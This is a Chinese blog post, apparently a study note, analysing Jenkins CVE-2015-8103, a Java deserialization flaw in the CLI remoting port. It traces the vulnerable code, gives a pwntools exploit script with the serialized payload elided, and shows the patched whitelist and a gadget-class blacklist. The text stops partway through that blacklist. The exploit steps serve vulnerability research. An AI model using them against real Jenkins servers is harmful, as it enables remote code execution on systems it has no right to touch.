<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="摸鱼">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  <title>Jenkins相关漏洞学习（一） - Twings</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期二, 十一月 24日 2020, 2:30 下午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    7k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      36 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> Jenkins 历史漏洞学习记录。</p>
<span id="more"></span>

<hr>
<h3 id="CVE-2015-8103"><a href="#CVE-2015-8103" class="headerlink" title="CVE-2015-8103"></a>CVE-2015-8103</h3><p>用 docker 开个 Jenkins 环境：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins:1.625.1</span><br><span class="line">docker run -<span class="built_in">id</span> --name jenkins -p 32770:8080 -p32771:50000 jenkins:1.625.1</span><br></pre></td></tr></table></figure>

<p>然后从里面把 war 包拖出来解压打开。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>该漏洞发生在 Jenkins 的 cli 模块，访问可以在 HTTP Headers 中找到 cli 端口为 50000：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache,no-store,must-revalidate</span><br><span class="line"><span class="attribute">X-Hudson-Theme</span><span class="punctuation">: </span>default</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html;charset=UTF-8</span><br><span class="line"><span class="attribute">X-Hudson</span><span class="punctuation">: </span>1.395</span><br><span class="line"><span class="attribute">X-Jenkins</span><span class="punctuation">: </span>1.625.1</span><br><span class="line"><span class="attribute">X-Jenkins-Session</span><span class="punctuation">: </span>326782aa</span><br><span class="line"><span class="attribute">X-Hudson-CLI-Port</span><span class="punctuation">: </span>50000</span><br><span class="line"><span class="attribute">X-Jenkins-CLI-Port</span><span class="punctuation">: </span>50000</span><br><span class="line"><span class="attribute">X-Jenkins-CLI2-Port</span><span class="punctuation">: </span>50000</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>sameorigin</span><br><span class="line"><span class="attribute">X-Instance-Identity</span><span class="punctuation">: </span>...</span><br><span class="line"><span class="attribute">X-SSH-Endpoint</span><span class="punctuation">: </span>...</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3221</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Jetty(winstone-2.8)</span><br></pre></td></tr></table></figure>

<p>这个端口是由 TcpSlaveAgentListener 对象监听的一个 TCP 端口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TcpSlaveAgentListener</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="string">&quot;TCP slave agent listener port=&quot;</span> + port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serverSocket = ServerSocketChannel.open();</span><br><span class="line">        <span class="built_in">this</span>.serverSocket.socket().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(port));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (BindException var3) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.configuredPort = port;</span><br><span class="line">    LOGGER.log(Level.FINE, <span class="string">&quot;JNLP slave agent listener started on TCP port &#123;0&#125;&quot;</span>, <span class="built_in">this</span>.getPort());</span><br><span class="line">    <span class="built_in">this</span>.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其 run 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="built_in">this</span>.serverSocket.accept().socket();</span><br><span class="line">            s.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">            s.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">            (<span class="keyword">new</span> <span class="title class_">TcpSlaveAgentListener</span>.ConnectionHandler(s)).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.shuttingDown) &#123;</span><br><span class="line">            LOGGER.log(Level.SEVERE, <span class="string">&quot;Failed to accept JNLP slave agent connections&quot;</span>, var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接收到一个 TCP 连接后交给 ConnectionHandler 对象处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConnectionHandler</span><span class="params">(Socket s)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.s = s;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.getClass()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = TcpSlaveAgentListener.iotaGen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.setName(<span class="string">&quot;TCP slave agent connection handler #&quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; with &quot;</span> + s.getRemoteSocketAddress());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TcpSlaveAgentListener.LOGGER.info(<span class="string">&quot;Accepted connection #&quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; from &quot;</span> + <span class="built_in">this</span>.s.getRemoteSocketAddress());</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="built_in">this</span>.s.getInputStream());</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="built_in">this</span>.s.getOutputStream(), <span class="string">&quot;UTF-8&quot;</span>)), <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">        <span class="keyword">if</span> (s.startsWith(<span class="string">&quot;Protocol:&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> s.substring(<span class="number">9</span>);</span><br><span class="line">            <span class="type">AgentProtocol</span> <span class="variable">p</span> <span class="operator">=</span> AgentProtocol.of(protocol);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">                p.handle(<span class="built_in">this</span>.s);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.error(out, <span class="string">&quot;Unknown protocol:&quot;</span> + s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.error(out, <span class="string">&quot;Unrecognized protocol: &quot;</span> + s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException var8) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var9) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从传输数据中读取一个字符串 “Protocol:”，然后从其后面读取协议名并调用相应协议的 handler 函数，这里传入 “CLI-connect” 进入 CliProtocol 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(Socket socket)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="title class_">CliProtocol</span>.Handler(<span class="built_in">this</span>.nio.getHub(), socket)).run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Handler</span><span class="params">(NioChannelHub hub, Socket socket)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.hub = hub;</span><br><span class="line">    <span class="built_in">this</span>.socket = socket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="built_in">this</span>.socket.getOutputStream(), <span class="string">&quot;UTF-8&quot;</span>)), <span class="literal">true</span>);</span><br><span class="line">    out.println(<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.runCli(<span class="keyword">new</span> <span class="title class_">Connection</span>(<span class="built_in">this</span>.socket));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">runCli</span><span class="params">(Connection c)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CLI channel from &quot;</span> + <span class="built_in">this</span>.socket.getInetAddress();</span><br><span class="line">    <span class="type">ChannelBuilder</span> <span class="variable">cb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChannelBuilder</span>(name, Computer.threadPoolForRemoting);</span><br><span class="line">    <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> cb.withMode(Mode.BINARY).withRestricted(<span class="literal">true</span>).withBaseLoader(Jenkins.getInstance().pluginManager.uberClassLoader).build(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(c.in), <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(c.out));</span><br><span class="line">    channel.setProperty(CliEntryPoint.class.getName(), <span class="keyword">new</span> <span class="title class_">CliManagerImpl</span>(channel));</span><br><span class="line">    channel.join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 runCli 函数中会调用 ChannelBuilder 类的 build 函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; preambles.length; ++i) &#123;</span><br><span class="line">    <span class="type">byte</span>[] preamble = preambles[i];</span><br><span class="line">    <span class="keyword">if</span> (preamble[ptr[i]] == ch) &#123;</span><br><span class="line">        <span class="keyword">if</span> (++ptr[i] == preamble.length) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(i) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> (mode == Mode.NEGOTIATE) &#123;</span><br><span class="line">                        mode = modes[i];</span><br><span class="line">                        os.write(mode.preamble);</span><br><span class="line">                        os.flush();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (modes[i] != mode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Protocol negotiation failure&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.makeTransport(is, os, mode, cap);</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    cap = Capability.read(is);</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ptr[i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ptr[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会跟三个 preambles 进行比较，然后做相应的操作，可以看到当符合第三个 preamble 时，会调用 Capability.read，第三个 preamble 为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PREAMBLE = <span class="string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>而 Capability.read 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Capability <span class="title function_">read</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Mode.TEXT.wrap(is));</span><br><span class="line">        <span class="keyword">return</span> (Capability)ois.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (Error)(<span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var2.getMessage())).initCause(var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会进行 Java 反序列化，而观察 Jenkins 项目中 lib 目录下的 jar，可以发现里面存在 commons-collections-3.2.1.jar，所以可以用 ysoserial 生成序列化攻击链。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>用 pwntools 写个简单的交互脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">target = remote(<span class="string">&quot;...&quot;</span>, <span class="number">50000</span>)</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;Protocol:CLI-connect&quot;</span></span><br><span class="line">target.send(<span class="string">&quot;\x00&quot;</span> + <span class="built_in">chr</span>(<span class="built_in">len</span>(protocol)) + protocol)</span><br><span class="line">target.recv()</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;aced...787878&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">target.send(<span class="string">&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;</span>)</span><br><span class="line">target.send(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">target.interactive()</span><br><span class="line">target.close()</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在往后的版本（2.46.1）中流程发生了变化，不过逻辑变化不大，最后在 Capability.read 中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Capability <span class="title function_">read</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Channel.Mode.TEXT.wrap(is)) &#123;</span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">n</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">                <span class="keyword">if</span> (!n.equals(<span class="string">&quot;java.lang.String&quot;</span>) &amp;&amp; !n.equals(<span class="string">&quot;[Ljava.lang.String;&quot;</span>) &amp;&amp; !n.equals(Capability.class.getName())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Rejected: &quot;</span> + n);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> (Capability)ois.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var2) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (Error)(<span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(var2.getMessage())).initCause(var2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对反序列化的类做了限制，只允许 String、String 数组 和 Capability。</p>
<p>除此之外，还将其他很多反序列化点的 ObjectInputStream 类修改为 ObjectInputStreamEx，其 resolveClass 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.filter.check(Class.forName(<span class="built_in">this</span>.filter.check(name), <span class="literal">false</span>, <span class="built_in">this</span>.cl));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单来说就是一个正则一样的黑名单，其值如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_PATTERNS = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">    <span class="string">&quot;^bsh[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]google[.]inject[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]mchange[.]v2[.]c3p0[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]sun[.]jndi[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]sun[.]corba[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]sun[.]javafx[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^java[.]awt[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^java[.]rmi[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^javax[.]management[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^javax[.]naming[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^javax[.]script[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^javax[.]swing[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]apache[.]commons[.]beanutils[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]apache[.]commons[.]collections[.]functors[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]apache[.]myfaces[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]apache[.]wicket[.].*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;.*org[.]apache[.]xalan.*&quot;</span>, </span><br><span class="line">    <span class="string">&quot;^org[.]codehaus[.]groovy[.]runtime[.].*&quot;</span>, </span><br><span class="line">    <span 